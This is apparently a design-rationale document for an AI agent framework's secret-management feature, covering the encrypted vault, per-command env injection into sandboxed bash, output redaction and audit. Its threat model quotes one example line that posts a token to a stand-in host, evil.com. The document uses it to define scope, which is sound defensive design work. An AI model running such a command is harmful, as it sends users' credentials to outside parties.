# User-Managed Secrets + Bash `secret_env` Injection

**Status:** ✅ Shipped (branch `secret-management`, 2026-05-28). Built across
`aura-security` (`UserSecretManager` + `SecretVault::list_names`), `aura-tools`
(`SecretAccess` trait + `SpawnOpts` + `Secret*` tools + bash `secret_env`),
`aura-agent` (gateway impl + executor wiring), `aura-sandbox`
(`EnvPolicy::BaselineWithExtra`), and `aura-cli` (`secret add/list/delete`). The
per-module source-of-truth docs (`security.md`, `tools.md`, `cli.md`,
`sandbox.md`, `storage.md`) carry the *what*; this doc is the design
**rationale** (the *why* — the forks below, rejected alternatives, threat
model), mirroring [`mid-turn-user-interjection.md`](mid-turn-user-interjection.md).
One deviation from the spec below: the audit (D6) records injected secret names
via `tracing`, not a `ToolEventPayload` span event, because that enum is closed.

## Goal

Let a user store environment-variable-style secrets (`OPENAI_API_KEY` → a token)
and let the agent run shell commands *with those secrets present as real env
vars* — **without the agent, the LLM, the trace, or any log ever seeing the
plaintext**. The agent only ever passes secret **names**.

Surfaces:

- **CLI** (human, local terminal): `aura secret add | list | delete`.
- **Agent tools**: `secret_add`, `secret_list`, `secret_check` (no `secret_delete`).
- **Bash tool**: a new `secret_env: string[]` parameter — the named secrets are
  resolved from the vault and injected into the child process env for that one
  command, then scrubbed back out of stdout/stderr.

## Two constraints that shaped the design

1. **The sandbox wipes the environment.** `bwrap` runs with `--clearenv`, macOS
   `sandbox-exec` with `env -i`; the child only gets the baseline/allowlist
   (`PATH`, `HOME`, `TMPDIR`, …). `ExecSandbox::spawn_command` has **no env
   slot**. So secrets must be threaded through an explicit per-call channel —
   setting them in the *parent* process env + `EnvPolicy::Allowlist` is global,
   racy, and leaks to the parent, so it is rejected.
2. **Output scrubbing is regex-only.** `LeakDetector` matches *known formats*
   (AWS/GitHub/OpenAI/…). An arbitrary user token (`MY_TOKEN=9f3a…`) matches no
   rule and would **leak verbatim** if a command echoes it. The bash tool,
   however, knows the exact values it injected, so it can do exact-match
   redaction the regex layer cannot.

## Decisions

### D1 — Storage: reuse the vault under a `user_env.` namespace

Reuse `SecretVault` + the `secrets(name, encrypted_value)` table (AES-256-GCM,
on-disk master key — see Security notes). User secrets are keyed
`user_env.<NAME>`. A thin **`UserSecretManager`** in `aura-security` (next to
`SecretVault`) owns the single `USER_SECRET_PREFIX` const, name validation,
masked-preview, and list-by-prefix. No schema change.

- No collision: internal keys all contain `.` (`mcp.<name>.…`, `aura.tui.…`) or
  are placeholder strings (`[{REDACTED_SECRET_…}]`); a valid env var name (D8)
  has no `.`, and we prefix it anyway.
- `SecretVault` has no `list()` today → add `SecretVault::list_names()`
  delegating to `SecretStore::list()`; the manager filters/strips the prefix.

*Rejected:* a dedicated `user_secrets` table (more code + a second crypto
call-site to keep consistent with the vault, for no real isolation win).

### D2 — Placement: no new crate

| Piece | Home | Why |
|---|---|---|
| `UserSecretManager`, `USER_SECRET_PREFIX` | `aura-security` | next to `SecretVault`; reachable by `aura-tools` (dep already exists) |
| `secret_add` / `secret_list` / `secret_check` | `aura-tools/builtin/secret.rs` | alongside `BashTool`; `Tool` impls cannot live in `aura-security` (would close an `aura-tools ↔ aura-security` cycle) |
| Bash change | `aura-tools/builtin/bash.rs` | — |
| CLI `secret` family | `crates/cli/src/commands/secret.rs` | — |
| `SecretAccess` impl | `crates/agent` | only crate that sees both the trait (`aura-tools`) and the manager (`aura-security`) |

A standalone `crates/secret` was rejected: the manager must live below
`aura-tools` (cycle), so the crate would own only three thin tool structs while
its core type lived elsewhere.

### D3 — Tool access: `SecretAccess` trait on `ToolContext`

Define `trait SecretAccess` in `aura-tools`; add
`ctx.secrets: Option<Arc<dyn SecretAccess>>` to `ToolContext`, bound by the
agent layer exactly like `ctx.llm` (gateway/runtime path binds `Some`, argv-mode
leaves `None`). The impl lives in the agent crate over `SecurityGateway`
(already holds vault + minter) + `UserSecretManager`. This **reverses** the
"Secret access (deferred)" note in `tools.md` and honors that doc's principle
("upper layers inject secrets … no direct dependency"): the trait is in
`aura-tools`, the impl is injected from above.

```rust
#[async_trait]
pub trait SecretAccess: Send + Sync {
    /// Resolve named user secrets to plaintext for env injection (bash only).
    /// Errors if any name is missing (see D-defaults).
    async fn resolve_env(&self, names: &[String]) -> Result<Vec<(String, String)>>;

    /// Mint+vault a deterministic placeholder per value (idempotent) and
    /// literal-replace every occurrence in `text`. Reuses the gateway's
    /// existing mint/vault pipeline, so the placeholder is reveal-able.
    async fn redact(&self, text: &str, values: &[String]) -> Result<String>;

    async fn add(&self, name: &str, value: &[u8], overwrite: bool) -> Result<AddOutcome>;
    async fn list_names(&self) -> Result<Vec<String>>;
    async fn exists(&self, names: &[String]) -> Result<Vec<(String, bool)>>;
}
```

The CLI does **not** use this trait — it talks to `UserSecretManager` directly
(built from `ctx.secret_vault`), so the prefix/validation/preview logic has a
single source of truth shared with the agent impl.

### D4 — Bash injection plumbing: `SpawnOpts` struct

Replace the positional tail of `ExecSandbox::spawn_command` with a struct:

```rust
spawn_command(&self, program: &Path, args: &[String], opts: SpawnOpts) -> Result<SandboxedOutput>;
// SpawnOpts { cwd: Option<PathBuf>, stdin: Option<Vec<u8>>, extra_env: Vec<(String,String)>, timeout: Duration }
```

`SandboxAdapter` merges `extra_env` into `SandboxSpec` **after** the
baseline/allowlist resolution (orthogonal to `EnvPolicy`, which stays
`Baseline`/`Allowlist`) → `bwrap --setenv K V`, macOS env args; the unsandboxed
paths use `Command::env(k, v)`. Inject on **all** spawn paths (sandboxed,
aura-CLI bypass, bwrap-failed retry) — each is the user's authorized command.
Secrets never enter the command string (kept separate from the `uv_env_prefix`
string prefix), so they never reach params/trace/logs.

*Rejected:* adding a bare `extra_env` param (positional sprawl) or a second
`spawn_command_with_env` method (duplicated impl bodies, drift). The struct is a
small, future-proof refactor across the few callers.

### D5 — Output scrubbing: bash-side exact redact + regex fallback

After capture, bash calls `ctx.secrets.redact(&stdout, &injected_values)` (and
stderr). The executor's existing `sanitize_tool_output` (regex) still runs after
the tool returns, as defense-in-depth. **Exact-substring only** — transformed/
encoded echoes (base64, line-split) are not guaranteed caught.

**Threat model:** the agent/LLM/trace never *see* the value (the agent only ever
passed names). This is **not** a guarantee that the authorized command cannot
exfiltrate the secret (`curl evil.com -d "$TOKEN"` is out of scope — same as any
CI runner). `redact` skips implausibly short values to avoid mangling unrelated
output.

### D6 — Approval: audit-only, no prompt

The sandbox gates filesystem/network but **not** credentials, yet we do **not**
add an approval prompt for secret injection: the user already chose to store the
secret and the agent only names it. `BashTool::accessed_resources` is unchanged
(still only destructive commands prompt). When `secret_env` is used, the tool
emits an audit event via `ctx.events` recording the secret **names** (never
values); the existing event-drain (`tools.md` event sink → `SpanEventKind::
ToolEvent`) already runs payloads through `sanitize_stream_fragment`.

*Considered & rejected:* gating via the existing `ResourceAccess::Env { vars }`
variant (which already models "wants these env vars on the user's behalf,
sensitive, per-session re-prompt"). Available if the posture is revisited, but
the chosen default is frictionless.

### D7 — `secret_add` tool: accept any value, reveal at boundary

`secret_add(name, value, overwrite?)`. `value` flows through the existing
tool-argument reveal boundary (`security.md` §"Tool-argument reveal boundary"):

- A **minted-placeholder** value (user pasted a token → `LeakDetector` minted it
  → agent only ever saw the placeholder) is revealed to plaintext for storage,
  and the **trace stays clean**. Leak-free.
- A **raw** value is already in the traced tool-call params before `execute()`
  runs — that upstream leak is the `LeakDetector`'s inherent limit, not fixable
  here. The **CLI (masked stdin) is the leak-free gold path** for raw entry; the
  tool's description steers the agent to pass the pasted-secret placeholder.

### D8 — CLI/tool surface details

- **`secret add`** (CLI): prompt name (plain line) → if it exists, confirm
  overwrite (`[y/N]`; `--force`/`--yes` skips; non-interactive requires the flag)
  → prompt value **masked** (`*` per char, via `read_masked_password`). Reject
  empty values. Validate name `^[A-Za-z_][A-Za-z0-9_]*$`, reject invalid,
  preserve case (no auto-uppercase).
- **`secret list`**: full `NAME` + masked value preview (first/last ~4 chars,
  middle masked, fully masked if short — requires decrypt, master key is
  in-process). The agent's **`secret_list` returns names only** (no value
  fragments to the LLM/trace).
- **`secret delete [NAME]`**: no-arg → interactive single-select picker
  (`select_one`) + confirm; `<NAME>` → direct + confirm (`--yes` skips; slash
  mode requires `--yes`). **No `secret_delete` agent tool.**
- **`secret_check(names: [])`**: returns per-name existence map
  (`{"FOO": true, "BAR": false}`); names/booleans only. Lets the agent verify
  several secrets before a bash run.
- **`secret_add` overwrite**: errors "already exists" unless `overwrite: true`,
  so the agent cannot silently clobber a credential.

## Data flows

- **Add (CLI):** name → existence/overwrite check → masked value → validate →
  `UserSecretManager.put("user_env.<NAME>", value, overwrite)` →
  `SecretVault` encrypts + persists. Plaintext never leaves the local process.
- **Add (tool):** agent calls `secret_add(name, <placeholder>)` → reveal boundary
  turns placeholder → plaintext → `ctx.secrets.add(...)`. Trace sees placeholder.
- **Bash run:** agent calls bash with `secret_env: ["FOO"]` →
  `ctx.secrets.resolve_env` → `[("FOO", val)]` → audit event (names) →
  `spawn_command(.., SpawnOpts { extra_env, .. })` → child sees `FOO=val` →
  capture → `ctx.secrets.redact(out, [val])` → return scrubbed → executor regex
  sanitize (defense-in-depth).
- **List / Check / Delete:** `UserSecretManager.list_names` (+per-entry decrypt
  for CLI preview) / `.exists` / `.delete`.

## Security notes

- **Persistence depends on the master keyfile.** The master key is minted once to
  `paths.encryption_key_file()` (`crates/setup/src/bootstrap.rs`,
  0600-validated) and reloaded every boot — so user secrets survive restart like
  MCP creds. Confidentiality of *all* vault contents rests on that file's
  protection; this feature adds no new key material.
- Reveal is vault-global (`security.md` §"Reveal API"); `user_env.*` values
  stored as placeholder→value by `redact` are revealable like any other.

## Documentation impact (done)

- ✅ **`tools.md`**: "Secret access (deferred)" replaced with the shipped
  `ctx.secrets` / `SecretAccess` design; the `Secret*` tools and bash `secret_env`
  + scrub + audit are documented in that section (the heavily-padded tool table
  was left alone — the prose section is the authoritative per-tool detail).
- ✅ **`security.md`**: `UserSecretManager` / `AddOutcome` / `USER_SECRET_PREFIX`
  + `SecretVault::list_names` added to the crate surface.
- ✅ **`cli.md`**: `secret` row added to the Command Reference (shipped).
- ✅ **`sandbox.md`**: `SpawnOpts` + per-call `extra_env` → `EnvPolicy::BaselineWithExtra`
  documented on the spawn bullet.
- ✅ **`storage.md`**: the shared `secrets` table now notes the `user_env.*`
  namespace alongside placeholders and `mcp.*`. Delete stays plain `DELETE`.
- **`docs/modules/README.md`**: no graph change (no new crate).
